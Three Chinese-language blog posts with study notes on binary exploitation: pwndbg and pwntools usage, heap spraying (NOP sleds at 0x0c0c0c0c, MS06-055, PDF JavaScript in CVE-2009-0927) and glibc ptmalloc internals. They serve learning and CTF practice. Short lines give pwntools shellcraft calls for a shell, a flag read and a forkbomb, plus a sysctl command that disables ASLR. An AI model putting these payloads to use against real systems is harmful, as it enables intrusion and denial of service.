<h3 id="ROPgadget和one-gadget"><a href="#ROPgadget和one-gadget" class="headerlink" title="ROPgadget和one_gadget"></a>ROPgadget和one_gadget</h3><h4 id="安装ROPgadget："><a href="#安装ROPgadget：" class="headerlink" title="安装ROPgadget："></a>安装ROPgadget：</h4><p>sudo apt-get install python-capstone</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p>
<p>cd ROPgadget</p>
<p>sudo python setup.py install</p>
<h4 id="安装one-gadget："><a href="#安装one-gadget：" class="headerlink" title="安装one_gadget："></a>安装one_gadget：</h4><p>sudo apt install ruby</p>
<p>sudo gem install one_gadget</p>
<h2 id="pwndbg介绍及常见应用"><a href="#pwndbg介绍及常见应用" class="headerlink" title="pwndbg介绍及常见应用"></a>pwndbg介绍及常见应用</h2><p>他是linux下的一款程序调试器</p>
<h4 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h4><blockquote>
<p>$ gdb 可执行程序</p>
</blockquote>
<h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><p>将目标程序转为汇编代码</p>
<blockquote>
<p>$ disass 函数名字或者地址</p>
<p>如果要反汇编一个地址到另外一个地址之间的内容</p>
<p>$ disass 地址1，地址2</p>
</blockquote>
<h4 id="下断点和删除断点"><a href="#下断点和删除断点" class="headerlink" title="下断点和删除断点"></a>下断点和删除断点</h4><p>b *地址 or b 函数名字</p>
<p>删除断点：delete 1就是删除第一个断点</p>
<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>r </p>
<h4 id="继续执行"><a href="#继续执行" class="headerlink" title="继续执行"></a>继续执行</h4><p>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br>n: 执行一行源程序代码，此行代码中的函数调用也一并执行。<br>s 相当于其它调试器中的“Step Into (单步跟踪进入)”；<br>n 相当于其它调试器中的“Step Over (单步跟踪)”。</p>
<h4 id="查看栈空间"><a href="#查看栈空间" class="headerlink" title="查看栈空间"></a>查看栈空间</h4><p>x/20xw 地址   显示20个单元，16进制，4字节每单元</p>
<blockquote>
<p>h=2 bytes,w=4 bytes,g=8 bytes.</p>
</blockquote>
<h4 id="查看堆空间"><a href="#查看堆空间" class="headerlink" title="查看堆空间"></a>查看堆空间</h4><p>x/32gx  堆地址</p>
<blockquote>
<p><strong>h=2 bytes,w=4 bytes,g=8 bytes.</strong></p>
</blockquote>
<p>格式：x/&lt;n/f/u&gt; <addr></p>
<p>整合这个命令的诠释：就是以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f。</p>
<p>n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p>
<p>f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p>
<p>x 按十六进制格式显示变量。</p>
<p>d 按十进制格式显示变量。</p>
<p>u 按十六进制格式显示无符号整型。</p>
<p>o 按八进制格式显示变量。</p>
<p>t 按二进制格式显示变量。</p>
<p>a 按十六进制格式显示变量。</p>
<p>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<p>u:就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:表示内存地址。</p>
<p><img src="https://i.imgur.com/lVsP3IX.png"></p>
<h4 id="查看程序内存结构"><a href="#查看程序内存结构" class="headerlink" title="查看程序内存结构"></a>查看程序内存结构</h4><p>vmmap</p>
<p><img src="https://i.imgur.com/SlGTNMF.png"></p>
<h3 id="pwntools-1"><a href="#pwntools-1" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="Pwntools主要模块及其使用"><a href="#Pwntools主要模块及其使用" class="headerlink" title="Pwntools主要模块及其使用"></a>Pwntools主要模块及其使用</h4><p>from pwn import *<br>io = remote(“127.0.0.1”, 32152)<br>#与互联网主机交互<br>io.sendline(“hello”)<br>io.send(“hello”)<br>#sendline发送数据会在最后多添加一个回车<br>io.recv(1024)<br>io.revuntil()<br>io.recvline()<br>#recv()读取1024个字节，recvline()会读取一直到回车，recvuntil()读取到指定数据<br>io.interactive()</p>
<p>io = process(“./bin”, shell=True)<br>#启动本地程序进行交互，用于gdb调试</p>
<p>io.interactive()<br>io.p32(0xdeadbeef)<br>io.p64(0xdeadbeefdeadbeef)</p>
<blockquote>
<p>p64 和 p32 则分别转换 8 bit 和 4 bit 数字</p>
</blockquote>
<p>io.u32(“1234”)<br>io.u64(“12345678”)</p>
<p>将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</p>
<p>shellcraft&amp;asm<br>pwntools的shellcraft主要用来生成汇编代码形式的shellcode,而asm的作用是根据汇编代码编译出二进制shellcode。</p>
<p>#生成执行sh的shellcode并编译<br>asm(pwnlib.shellcraft.thumb.linux.sh(), arch=”thumb”)<br>#可以将thumb换成对应cpu</p>
<p>#读取flag并输出到标准输出<br>pwnlib.shellcraft.i386.linux.cat(“flag”, fd=1)</p>
<p>#使用forkbomb破坏系统（慎用）<br>pwnlib.shellcraft.i386.linux.forkbomb()</p>
<p>context<br>context.log_level = “debug”<br>context.arch = “amd64”</p>
<blockquote>
<p>设置成debug，pwntools会将所有io数据等输出，方便编写poc的时候进行调试，而arch可以设置攻击目标的指令构架。</p>
</blockquote>
<p>ELF<br>用于读取elf文件中的各种结构数据。例如plt，got，函数地址等等。</p>
<p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/">pwntools — pwntools 4.3.1 documentation</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/03/25/Heap-Spray/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/03/25/Heap-Spray/" class="post-title-link" itemprop="url">Heap Spray</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-03-25 19:12:23" itemprop="dateCreated datePublished" datetime="2021-03-25T19:12:23+08:00">2021-03-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-04-24 23:40:54" itemprop="dateModified" datetime="2021-04-24T23:40:54+08:00">2021-04-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Windows内存保护机制"><a href="#Windows内存保护机制" class="headerlink" title="Windows内存保护机制"></a>Windows内存保护机制</h2><ul>
<li>GS编译</li>
<li>SafeSEH机制</li>
<li>SEH覆盖保护</li>
<li>数据执行保护（DEP）</li>
<li>地址随机化（ASLR）</li>
</ul>
<h3 id="GS编译–canary"><a href="#GS编译–canary" class="headerlink" title="GS编译–canary"></a>GS编译–canary</h3><p>​             —linux【canary】</p>
<p>​    GS编译保护技术是通过编译时添加相关代码而实现的，开启GS 编译选项后会在函数的开头和结尾添加代码来阻止栈溢出漏洞的利用。当应用程序启动时，程序的cookie被计算出来（伪随机数）并保存在.data 节段中，在函数的开头这个 cookie 被拷贝到栈中，位于返回地址和局部变量的中间。函数调用完后系统检测cookie值是否被修改。</p>
<blockquote>
<p>使用IDA反汇编会看到这个随机数被标记为：Security Cookie</p>
</blockquote>
<p>系统还将在.data的内存区域存放一个Security Cookie的副本</p>
<p><img src="https://i.imgur.com/b6xEJAG.png"></p>
<p><img src="https://i.imgur.com/SsoJBNy.png"></p>
<h3 id="堆在gdb中查看内存"><a href="#堆在gdb中查看内存" class="headerlink" title="堆在gdb中查看内存"></a>堆在gdb中查看内存</h3><p><img src="https://i.imgur.com/cKrR3u7.png"></p>
<p>？：21和20d51是什么意思</p>
<p>21是AMP中的MP，M若不是1则就是heap分配的，p为1表示前一个chunk正在使用。</p>
<p><img src="https://i.imgur.com/D3SdtC6.png"></p>
<p>在 gdb 调试中，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;32gx &amp;main_arena</span><br></pre></td></tr></table></figure>
<p>可以看到 main_arena 的内存分配情况。</p>
<p><img src="https://i.imgur.com/EpjrAaB.png"></p>
<h3 id="HEAP-SPRAY"><a href="#HEAP-SPRAY" class="headerlink" title="HEAP SPRAY"></a>HEAP SPRAY</h3><p>无论是栈溢出还是堆溢出，最终都会获得EIP。我们很难的浏览器中复杂的内存环境下布置完整的shellcode。页面中的javascript可以申请堆内存，因此，shellcode</p>
<p>通过javascript布置在堆中成为可能。</p>
<p>在使用堆喷的时候，一般会将eip指向堆区的0x0c0c0c0c的位置。</p>
<blockquote>
<p>修改虚函数表，将其指向0x0c0c0c0c,为什么选择这个地址呢，因为执行这个地址也不会对我们shellcode有什么影响。</p>
<p>0x0C0C0C0C将被含有shellcode的内存片覆盖，只要内存片中的0x90能够命中0x0c0c0c0c的位置，shellcode就能最终执行。 </p>
</blockquote>
<p><img src="https://i.imgur.com/sb4QjrL.png"></p>
<p>任意nop命中0x0c0c0c0c攻击就能成功。</p>
<h4 id="实践堆喷MS06-055分析"><a href="#实践堆喷MS06-055分析" class="headerlink" title="实践堆喷MS06-055分析"></a>实践堆喷MS06-055分析</h4><p>存在栈溢出，控制了eip。返回地址被填上0x0c0c0c0c。</p>
<p>我们将nop和shellcode组合成的内存片填充直到200mb。</p>
<p>当跳转到0x0c0c0c0c的时候就会执行nop最后执行我们的shellcode的。</p>
<p>javascript以unicode形式识别字符串。</p>
<blockquote>
<p>“\x44\x77” 转化成“\u7744”以\u为转义符，将双字节逆序。</p>
</blockquote>
<h3 id="PDF中的JS–cve-2009-0927"><a href="#PDF中的JS–cve-2009-0927" class="headerlink" title="PDF中的JS–cve-2009-0927"></a>PDF中的JS–cve-2009-0927</h3><h4 id="pdf文档格式"><a href="#pdf文档格式" class="headerlink" title="pdf文档格式"></a>pdf文档格式</h4><p>是一种文本和二进制混排的格式。由四部分构成：</p>
<p><img src="https://i.imgur.com/WyBBxbg.png"></p>
<p><img src="https://i.imgur.com/cEin8Em.png"></p>
<p><img src="https://i.imgur.com/ECyv9JD.png"></p>
<p><img src="https://i.imgur.com/BDtFkFN.png"></p>
<p><img src="https://i.imgur.com/oTVR8vp.png"></p>
<p>一个pdf文件被打开时就会执行openaction对象里面的脚本，只要在openaction对象里添加精心构造的JS脚本就可以实现对ADOBE READER的攻击。</p>
<p>xref:f表示被删除或者没有用。</p>
<p>pdf格式详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bobob/article/details/751381?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-6&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/bobob/article/details/751381?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-6&amp;spm=1001.2101.3001.4242</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/03/23/glibc-ptmalloc1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/03/23/glibc-ptmalloc1/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-03-23 13:41:19" itemprop="dateCreated datePublished" datetime="2021-03-23T13:41:19+08:00">2021-03-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-09-11 21:02:41" itemprop="dateModified" datetime="2021-09-11T21:02:41+08:00">2021-09-11</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>title: glibc ptmalloc1<br>date: 2021-03-23 13:41:19<br>tags:</p>
<h3 id="x86平台linux进程内存布局"><a href="#x86平台linux进程内存布局" class="headerlink" title="x86平台linux进程内存布局"></a>x86平台linux进程内存布局</h3><blockquote>
<p>Linux 系统在装载 elf 格式的程序文件时，会调用 loader 把可执行文件中的各个段依次 载入到从某一地址开始的空间中（载入地址取决 link editor(ld)和机器地址位数，在 32 位机 器上是 0x8048000，即 128M 处）。</p>
</blockquote>
<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p><img src="https://i.imgur.com/2bvQPBh.png"></p>
<p>mmap映射区域一般从TASK_SIZE/3开始.栈是有界的</p>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p><img src="https://i.imgur.com/YeVDhxg.png"></p>
<blockquote>
<p>上图是 X86_64 下 Linux 进程的默认内存布局形式，这只是一个示意图.</p>
<p>当前内核默认 配置下，进程的栈和 mmap 映射区域<strong>并不是从一个固定地址开始</strong>，并且每次启动时的值都 不一样，这是程序在启动时随机改变这些值的设置，使得使用缓冲区溢出进行攻击更加困难。 </p>
<p>当然也可以让进程的栈和 mmap 映射区域从一个固定位置开始，只需要设置全局变量 randomize_va_space 值 为 0 ， 这 个 变 量 默 认 值 为 1 。 用 户 可 以 通 过 设 置 /proc/sys/kernel/randomize_va_space 来停用该特性，也可以用如下命令： sudo sysctl -w kernel.randomize_va_space=0</p>
</blockquote>
<p>heap 和 mmap 映射区域是可以提供给用户程序使用的虚拟内存空间。</p>
<blockquote>
<p>堆至底向上扩展，mmap 映射区 域至顶向下扩展，mmap 映射区域和堆相对扩展，直至耗尽虚拟地址空间中的剩余区域，这 种结构便于 C 运行时库使用 mmap 映射区域和堆进行内存分配。</p>
</blockquote>
<h3 id="操作系统内存分配的相关函数"><a href="#操作系统内存分配的相关函数" class="headerlink" title="操作系统内存分配的相关函数"></a>操作系统内存分配的相关函数</h3><p>head—-brk()[系统调用]/sbrk()[c库函数]</p>
<p>mmap—-mmap()\munmap()</p>
<p>这些函数都可以用来向我们的进程添加额外的虚拟内存。</p>
<h4 id="内存的延迟分配"><a href="#内存的延迟分配" class="headerlink" title="内存的延迟分配"></a>内存的延迟分配</h4><p>只有在真正访问一个地址的时候才建立这个地址的物理映射，之前只是线性区（虚拟内存）</p>
<blockquote>
<p>内核释放物理页面是通过释放线性区，找到其所对应的物理页面，将其全部释放的过 程。</p>
</blockquote>
<h4 id="进程描述符task-struct"><a href="#进程描述符task-struct" class="headerlink" title="进程描述符task_struct"></a>进程描述符task_struct</h4><h4 id="内存描述符mm-struct"><a href="#内存描述符mm-struct" class="headerlink" title="内存描述符mm_struct"></a>内存描述符mm_struct</h4><p>mm_struct是内核数据结构。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/xiaosolll/eetan/blob/main/mm_struct%E6%B3%A8%E9%87%8A%E6%BA%90%E7%A0%81%E8%AE%B0%E5%BD%95">https://github.com/xiaosolll/eetan/blob/main/mm_struct%E6%B3%A8%E9%87%8A%E6%BA%90%E7%A0%81%E8%AE%B0%E5%BD%95</a>    —–【mm_struct的源码注释】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsigned long start_code, end_code, start_data, end_data;</span><br></pre></td></tr></table></figure>
<p>start_code和end_code是进程代码段的起始和终止地址,start_data和end_data是进程数据段的起始和终止地址。</p>
<p>来自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26768741/article/details/54375524">https://blog.csdn.net/qq_26768741/article/details/54375524</a></p>
<h4 id="heap操作相关函数"><a href="#heap操作相关函数" class="headerlink" title="heap操作相关函数"></a>heap操作相关函数</h4><blockquote>
<p>start_stack 是进程堆栈 段起始地址，start_brk 是进程动态内存分配起始地址（堆的起始地址），还有一个 brk（堆 的当前最后地址），就是动态内存分配当前的终止地址。</p>
<p>C 语言的动态内存分配基本函数是 malloc()，在 Linux 上的实现是通过内核的 brk 系统调用。brk()是一个非常简单的系统调用， 只是简单地<strong>改变 mm_struct 结构的成员变量 brk</strong> 的值。</p>
</blockquote>
<h4 id="Mmap映射区域操作相关函数"><a href="#Mmap映射区域操作相关函数" class="headerlink" title="Mmap映射区域操作相关函数"></a>Mmap映射区域操作相关函数</h4><p>mmap()函数将一个文件或者其它对象映射进内存。</p>
<p>实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系</p>
<p><img src="https://i.imgur.com/P9qrTPp.png"></p>
<blockquote>
<p>操作系统以**<em>内存页**</em>为<em>单位</em>管理内存,绝大多数处理器上的内存页的默认大小都是 <strong>4KB</strong></p>
<p>操作系统与磁盘打交道的最小单位是磁盘块。 目前是4k大小。</p>
</blockquote>
<p>munmap 执行相反的操作，删除特定地址区域的对象映射。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">void *mmap(void *addr, size_t length, int prot(期望的内存保护标志), int flags（指定映射对象类型，映射选项和映射页是否可以共享）, int fd, off_t offset);</span><br><span class="line"></span><br><span class="line">int munmap(void *addr, size_t length);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="内存管理的方法"><a href="#内存管理的方法" class="headerlink" title="内存管理的方法"></a>内存管理的方法</h4><h5 id="c风格–malloc、free"><a href="#c风格–malloc、free" class="headerlink" title="c风格–malloc、free"></a>c风格–malloc、free</h5><p>程序主要通过调用brk（）或者mmap（）进程添加额外的虚拟内存。</p>
<h5 id="池式内存管理"><a href="#池式内存管理" class="headerlink" title="池式内存管理"></a>池式内存管理</h5><p>内存池–自动内存管理</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bangerlee/archive/2011/09/01/2161437.html">内存池的实现(二) - bangerlee - 博客园 (cnblogs.com)</a></p>
<h5 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h5><p>当传递一个指向某个数据结构指针，引用计数+1</p>
<p>当程序完成对这个数据结构的使用的时候，计数-1，结束动作，检查计数器是否为0，为0释放内存。</p>
<h5 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h5><p>全自动检测并移除不再使用的数据对象</p>
<p>运行：当可用内存减少到一个具体阈值。</p>
<h4 id="c内存管理程序"><a href="#c内存管理程序" class="headerlink" title="c内存管理程序"></a>c内存管理程序</h4><h5 id="doug-lea-malloc"><a href="#doug-lea-malloc" class="headerlink" title="doug lea malloc"></a>doug lea malloc</h5><p>包括：doug lea的原始分配程序、GNU libc 分配程序和 ptmalloc</p>
<blockquote>
<p>加入了索引，搜索速度up</p>
</blockquote>
<h5 id="BSD-malloc"><a href="#BSD-malloc" class="headerlink" title="BSD malloc"></a>BSD malloc</h5><p>从预先确定大小的对象构成的池中分配对象。</p>
<h5 id="Hoard"><a href="#Hoard" class="headerlink" title="Hoard"></a>Hoard</h5><p>多线程环境、锁的使用为中心</p>
<h5 id="TCMalloc"><a href="#TCMalloc" class="headerlink" title="TCMalloc"></a>TCMalloc</h5><p>集成内存池和垃圾回收的优点</p>
<p>小内存：8整数倍分配</p>
<p>大内存：4k的整数倍分配</p>
<h3 id="ptmalloc"><a href="#ptmalloc" class="headerlink" title="ptmalloc"></a>ptmalloc</h3><blockquote>
<p>使用环形链表管理，每个分配区利用互斥锁（mutex）使线程对于该分配区的访问互斥。</p>
<p>每个进程只有一个主分配区，但可能存在多个非主分配区</p>
</blockquote>
<h4 id="主分配区-main-arena"><a href="#主分配区-main-arena" class="headerlink" title="主分配区  main_arena"></a>主分配区  main_arena</h4><p>可访问<strong>heap区域和mmap区域</strong>,可以用sbrk和mmap向操作系统申请虚拟内存。</p>
<h4 id="非主分配区-non-main-arena"><a href="#非主分配区-non-main-arena" class="headerlink" title="非主分配区    non_main_arena"></a>非主分配区    non_main_arena</h4><p>只能访问<strong>mmap映射区域</strong></p>
<p>mmap（）向操作系统‘批发‘HEAP_MAX_SIZE默认大小：</p>
<p>32位:1MB</p>
<p>64位:64MB</p>
<blockquote>
<p>为什么要先批发一块大小?</p>
<p>系统调用是相对低效的，直接从用户空间分配内存快多了。讲这块大小切割成小块。</p>
</blockquote>
<p>线程调用malloc分配内存空间时：</p>
<p>先查看线程私有变量是否已经存在一个分配区，存在尝试加锁，失败则去分配区链表试图获取一个没有加锁的分配区，如果链表中所有分配区都加锁，则malloc会新开辟一个分配区，将其加入到全局分配区循环链表并加锁且使用这个分配区分配内存。</p>
<p>释放时同样要获取锁。</p>
<h4 id="chunk的组织"><a href="#chunk的组织" class="headerlink" title="chunk的组织"></a>chunk的组织</h4><blockquote>
<p>不管内存是在哪里被分配的，用什么方法分配，用户请求分配的空间在 ptmalloc 中都使用一个 chunk 来表示。用户调用 free()函数释放掉的内存也并不是立即就归还给操作系统，相反，它们也会被表示为一个 <strong>chunk</strong></p>
</blockquote>
<h5 id="chunke-的格式"><a href="#chunke-的格式" class="headerlink" title="chunke 的格式"></a>chunke 的格式</h5><h6 id="使用中"><a href="#使用中" class="headerlink" title="使用中"></a>使用中</h6><p><img src="https://i.imgur.com/7iZjNvQ.png"></p>
<p>mem指针才是真正返回给用户的内存指针</p>
<p>AMP：</p>
<blockquote>
<p>1.NON_MAIN_ARENA     这个堆块是否位于主线程<br>2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的<br>3.PREV_INUSE         记录前一个 chunk 块是否被分配</p>
</blockquote>
<p>A:表示当前chunk属于主分配区还是非主分配区。1：主分配区，否则置零。</p>
<p>M:当前chunk从哪个内存区域获得的虚拟内存。1：从mmap映射区域分配的，否则从heap区分配。</p>
<p>P：<strong>前一个chunk</strong>的使用情况，1表示正在使用，不能对前一个chunk进行任何操作，不可以得到前一个chunk的大小。</p>
<blockquote>
<p>P 为 0 则表示前一个 chunk 为空闲，这时<br>chunk 的第一个域 prev_size 才有效，prev_size 表示前一个 chunk 的 size，程序可以使用这个<br>值来找到前一个 chunk 的开始地址。</p>
</blockquote>
<h6 id="空闲中"><a href="#空闲中" class="headerlink" title="空闲中"></a>空闲中</h6><p><img src="https://i.imgur.com/qNCQfMF.png"></p>
<p><img src="https://i.imgur.com/ua5MFL5.png"></p>
<p><img src="https://i.imgur.com/eTCqD64.png"></p>
<p>无M状态。</p>
<p>原本属于用户数据区的地方存储了四个指针。</p>
<p>fd–&gt;指向后一个空闲的chunk</p>
<p>bk–&gt;指向前一个空闲的chunk</p>
<p>fdsize、bksize用用于加快在large bin中查找最近匹配的空闲chunk。</p>
<h4 id="chunk的空间复用"><a href="#chunk的空间复用" class="headerlink" title="chunk的空间复用"></a>chunk的空间复用</h4><p>一chunk 或者正在被使用，或者已经被 free 掉，所以 chunk 的中的一些域可以在使用状态和空闲状态表示不同的意义，来达到空间复用的效果。</p>
<blockquote>
<p>一个使用中的 chunk 的大小的计算公式应该是：</p>
<p>in_use_size = (用户请求大小+ 8 - 4 ) align to 8B，这里加 8 是因为需要存储 prev_size 和 size，</p>
<p>但又因为向下一个 chunk“借”了 4B，所以要减去 4。最后，因为空闲的 chunk 和使用中的</p>
<p>chunk 使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即最终的分配空间 chunk_size = max(in_use_size, 16)。这就是当用户请求内存分配时，ptmalloc 实际需要分配的内存大小</p>
</blockquote>
<h4 id="空闲的chunk容器"><a href="#空闲的chunk容器" class="headerlink" title="空闲的chunk容器"></a>空闲的chunk容器</h4><h5 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h5><p>用户free掉的内存不会马上归还给系统，。ptmalloc将相似大小的 chunk 用双向链表链接起来，这样的一个链表被称为一个 bin(unsorted bin   small bins large bins)。ptmalloc一共维护了128个bin。</p>
<p><img src="https://i.imgur.com/v5nDgRk.png"></p>
<blockquote>
<p>下次分配请求时，ptmalloc首先从空闲的chunk中挑选一块给用户。</p>
<p>最后释放的 chunk 被链接到链表的头部，而申请 chunk 是从链表尾部开始</p>
</blockquote>
<blockquote>
<p>当空闲的 chunk 被链接到 bin 中的时候，ptmalloc 会把表示该 chunk 是否处于使用中的标志 P 设为 0（注意，<strong>这个标志实际上处在下一个 chunk 中</strong>），同时 ptmalloc 还会检查它<strong>前后的 chunk</strong> 是否也是空闲的，如果是的话，ptmalloc 会首先把它们<strong>合并</strong>为一个大的 chunk，然后将合并后的 chunk 放到 <strong>unstored bin</strong> 中。要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些<strong>小的的 chunk 先放到一个叫做fast bins 的容器内。</strong> </p>
</blockquote>
<h5 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h5><p>不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins<br> 中，fast bins 中的 chunk <code>并不改变它的使用标志 P。这样也就无法将它们合并。</code></p>
<blockquote>
<p>当需要给用户分配的 <strong>chunk 小于或等于 max_fast 时</strong>，ptmalloc 首先会在 fast bins 中查找相应的空闲块，然后才会去查找bins中的空闲chunk。</p>
</blockquote>
<p>特定时候：ptmalloc会遍历fastbins中的chunk，将相邻的空闲的chunk合并。合并的chunk加入unsorted bin中，然后再将unsorted bin里的chunk加入bins中。</p>
<h5 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h5><p>是bin数组的第一个，可以看作是bins的一个缓冲区。</p>
<p>寻找合适的chunk：</p>
<p>1.fast bins</p>
<p>2.unsorted bin</p>
<p>3.bins–(small\large)</p>
<h5 id="特殊的chunk"><a href="#特殊的chunk" class="headerlink" title="特殊的chunk"></a>特殊的chunk</h5><p>并不是所有的 chunk 都按照上面的方式来组织，实际上，有三种例外情况。Top chunk，mmaped chunk 和 last remainder。</p>
<h6 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h6><p>不包含在任何bin中。</p>
<p>非主分配区：</p>
<p>​      在非主分配区中会预先从mmap区域分配一块较大得到空闲内存模拟sub-heap，通过管理sub-heap来响应用户需求。</p>
<p>内存是按地址<strong>从低向高进行分配</strong>的，在空闲内存的最高处，必然存在着一块空闲 chunk，叫做 top chunk。</p>
<p><img src="https://i.imgur.com/P9qrTPp.png"></p>
<p>当bin和fast bins不能满足分配需求，则从top chunk中分出一块给用户。</p>
<p>若top chunk不够大，则重新分配一块sub-heap，将top chunk迁移到新sub-heap，新sub和旧sub用单向链表连接。再从新top chunk中分配一块内存。</p>
<p>top chunk会随着分配合并变大缩小，当top chunk包含整个sub-heap，ptmalloc会调用munmap把整个sub-heap的内存返回给操作系统。 </p>
<p>主分配区：</p>
<p>​        <img src="https://i.imgur.com/awhRiCY.png"></p>
<h6 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h6><p>当需要分配的 chunk 足够大，而且 fast bins 和 bins 都不能满足要求，甚至 top chunk 本身也不能满足分配需求时，ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。这样分配的 chunk 在被 free 时将直接解除映射，于是就将内存归还给了操作系统，再次对这样的内存区的引用将导致 segmentation fault 错误。这样的 chunk 也不会包含在任何bin 中。</p>
<h6 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h6><p>Last remainder 是另外一种特殊的 chunk，就像 top chunk 和 mmaped chunk 一样，不会在任何 bins 中找到这种 chunk。当需要分配一个 small chunk，但在 small bins 中找不到合适的 chunk，如果 last remainder chunk 的大小大于所需的 small chunk 大小，last remainder chunk被分裂成两个 chunk，其中一个 chunk 返回给用户，另一个 chunk 变成新的 last remainder chuk。</p>
<h4 id="sbrk和mmap"><a href="#sbrk和mmap" class="headerlink" title="sbrk和mmap"></a>sbrk和mmap</h4><p><img src="https://i.imgur.com/wMotikN.png"></p>
<p>start_brk–heap的开始</p>
<p>brk–heap的结束，可以通过brk（）sbrk（）来增加brk的值。</p>
<p>ptmalloc在开始时，若请求的空间小于mmap的分配阈值128kb</p>
<p>​                     |  主分配区：sbrk（）增加一块heap。</p>
<p>​                     |  非主分配区：mmap（）映射一块sub-heap。</p>
<p>需要分配的chunk：</p>
<p>1.小于mmap分配阈值，heap不够sbrk（）增加heap大小，每次增加都会对齐到4kb。</p>
<p>2.大于阈值，且主分配区sbrk（）失败，或者非主分配区在topchunk不能分配到需要的内存，直接mmap（）直接映射。</p>
<p>回收时：</p>
